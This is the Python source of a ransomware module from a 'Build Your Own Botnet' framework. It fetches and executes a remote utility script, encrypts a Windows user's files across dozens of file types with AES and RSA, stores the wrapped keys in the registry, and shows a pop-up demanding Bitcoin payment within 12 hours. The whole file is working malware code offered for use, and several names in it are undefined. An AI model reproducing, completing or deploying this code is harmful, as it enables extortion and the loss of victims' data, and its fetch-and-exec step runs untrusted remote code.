#!/usr/bin/python
# -*- coding: utf-8 -*-
'Ransom (Build Your Own Botnet)'

# standard library
import os
import sys
import imp
import json
import Queue
import base64
import urllib
import threading

# utilities
util = imp.new_module('util')
exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py', 'exec') in util.__dict__
sys.modules['util'] = util

# globals
packages = ['_winreg','Cryptodome.PublicKey.RSA','Cryptodome.Cipher.PKCS1_OAEP']
platforms = ['win32']
threads = {}
tasks = Queue.Queue()
filetypes = ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg',
	     '.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc',
             '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx',
             '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf',
             '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpe', '.jpeg','.tmp','.log','.py',
             '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.rwl', '.rw2','.pyc',
             '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw',  '.r3d', '.ptx','.css',
             '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.html',
             '.css','.js','.rb','.xml','.wmi','.sh','.asp','.aspx','.plist','.sql','.vbs','.ps1','.sqlite']
usage = 'ransom <encrypt/decrypt/payment>'
description = """
Encrypt the files on a client host machine and ransom the decryption key
back to the currently logged-in user for a payment in Bitcoin to a randomly
generated temporary wallet address that expires in 12 hours
"""

# setup
if util.is_compatible(platforms, __name__):
    util.imports(packages, globals())

# main
def _threader(tasks):
    try:
        retries = 0
        while True:
            try:
                method, task = tasks.get_nowait()
                if callable(method):
                    method(task)
                tasks.task_done()
            except:
                if retries < 3:
                    retries += 1
                    time.sleep(1)
                    continue
                else:
                    break
    except Exception as e:
        util.log("{} error: {}".format(_threader.func_name, str(e)))

@util.threaded
def _iter_files(rsa_key, base_dir=None):
    try:
        if isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
            if base_dir:
                if os.path.isdir(base_dir):
                    return os.path.walk(base_dir, lambda _, dirname, files: [globals()['tasks'].put_nowait((encrypt_file, (os.path.join(dirname, filename), rsa_key))) for filename in files], None)
                else:
                    util.log("Target directory '{}' not found".format(base_dir))
            else:
                cipher  = Cryptodome.Cipher.PKCS1_OAEP.new(rsa_key)
                reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, globals()['_registry_key'], 0, _winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        filename, key, _ = _winreg.EnumValue(reg_key, i)
                        key = cipher.decrypt(base64.b64decode(key))
                        globals()['tasks'].put_nowait((decrypt_file, (filename, key)))
                        i += 1
                    except:
                        _winreg.CloseKey(reg_key)
                        break
    except Exception as e:
        util.log('{} error: {}'.format(_iter_files.func_name, str(e)))


def request_payment(bitcoin_wallet, text=None, title=None):
    """ 
    Request ransom payment from user with a Windows alert message box

    `Required`
    :param str bitcoin_wallet:      a valid Bitcoin wallet address

    """
    try:
        if os.name is 'nt':
            if bitcoin_wallet:
                alert = util.alert(text = "Your personal files have been encrypted. The service fee to decrypt your files is $100 USD worth of bitcoin (try www.coinbase.com or Google 'how to buy bitcoin'). Below is the temporary bitcoin wallet address created for the transfer. It expires in 12 hours from now at %s, at which point the encryption key will be deleted unless you have paid." %  time.localtime(time.time() + 60 * 60 * 12))
            elif payment_url:
                alert = util.alert("Your personal files have been encrypted.\nThis is your Session ID: {}\nWrite it down. Click here: {}\n and follow the instructions to decrypt your files.\nEnter session ID in the 'name' field. The decryption key will be emailed to you when payment is received.\n".format(session['id'], payment_url), "Windows Alert")
            else:
                return "{} missing argument(s): bitcoin_wallet, payment_url"
            return "Launched a Windows Message Box with ransom payment information"
        else:
            return "{} does not yet support {} platform".format(request_payment.func_name, sys.platform)
    except Exception as e:
        return "{} error: {}".format(request_payment.func_name, str(e))


def encrypt_file(filename, rsa_key):
    """ 
    Encrypt a file with AES-256-OCB symmetric encryption
    using a randomly generated key, encrypt the key
    with RSA-2048 asymmetric encryption, then store the
    filename and RSA-encrypted AES-key as a key in the
    Windows Registry

    `Requires`
    :param str filename:          target filename
    :param RsaKey rsa_key:        2048-bit public RSA key

    Returns True if succesful, otherwise False
    """
    try:
        if os.path.isfile(filename):
            if os.path.splitext(filename)[1] in globals()['filetypes']:
                if isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
                    cipher  = Cryptodome.Cipher.PKCS1_OAEP.new(rsa_key)
                    aes_key = Cryptodome.Random.get_random_bytes(32)
                    with open(filename, 'rb') as fp:
                        data = fp.read()
                    ciphertext = security.encrypt_aes(data, aes_key)
                    with open(filename, 'wb') as fd:
                        fd.write(ciphertext)
                    key = base64.b64encode(cipher.encrypt(aes_key))
                    util.registry_key(globals()['_registry_key'], filename, key)
                    util.log('{} encrypted'.format(filename))
                    return True
        else:
            _debugger.debug("File '{}' not found".format(filename))
    except Exception as e:
        _debugger.debug("{} error: {}".format(encrypt_file.func_name, str(e)))
    return False


def decrypt_file(filename, key):
    """ 
    Decrypt a file that was encrypted with AES-256-OCB encryption

    `Required`
    :param str filename:    target filename
    :param str aes_key:     256-bit key

    Returns True if succesful, otherwise False
    """
    try:
        if os.path.isfile(filename):
            with open(filename, 'rb') as fp:
                ciphertext = fp.read()
            plaintext = security.decrypt_aes(ciphertext, key)
            with open(filename, 'wb') as fd:
                fd.write(plaintext)
            util.log('{} decrypted'.format(filename))
            return True
        else:
            _debugger.debug("File '{}' not found".format(filename))
    except Exception as e:
        _debugger.debug("{} error: {}".format(decrypt_file.func_name, str(e)))
    return False


def encrypt_files(args):
    """ 
    Encrypt all files that are not required for the machine to function

    `Required`
    :param str args:    filename and RSA key separated by a space

    """
    try:
        target, _, rsa_key = args.partition(' ')
        if os.path.exists(target):
            if not isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
                rsa_key = Cryptodome.PublicKey.RSA.importKey(rsa_key)
            if not rsa_key.can_encrypt():
                return "Error: RSA key cannot encrypt"
            if os.path.isfile(target):
                return encrypt_file(target, rsa_key)
            if os.path.isdir(target):
                globals()['threads']['iter-files']     = _iter_files(rsa_key, base_dir=target)
                globals()['threads']['encrypt-files']  = _threader()
                return "Encrypting files"
        else:
            return "File '{}' does not exist".format(target)
    except Exception as e:
        util.log("{} error: {}".format(encrypt_files.func_name, str(e)))


def decrypt_files(rsa_key):
    """ 
    Decrypt all encrypted files on host machine

    `Required`
    :param str rsa_key:     RSA private key in PEM format

   """
    try:
        if not isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
            rsa_key = Cryptodome.PublicKey.RSA.importKey(rsa_key)
        if not rsa_key.has_private():
            return "Error: RSA key cannot decrypt"
        globals()['threads']['iter-files']    = _iter_files(rsa_key)
        globals()['threads']['decrypt-files'] = _threader()
        return "Decrypting files"
    except Exception as e:
        util.log("{} error: {}".format(decrypt_files.func_name, str(e)))

def run(args=None):
    """ 
    Run the ransom module

    `Required`
    :param str args:  encrypt, decrypt, payment

    """
    if args:
        cmd, _, action = str(args).partition(' ')
        if 'payment' in cmd:
            return request_payment(action)
        elif 'decrypt' in cmd:
            return decrypt_files(action)
        elif 'encrypt' in cmd:
            reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
            return encrypt_files(action)
    return globals()['usage']
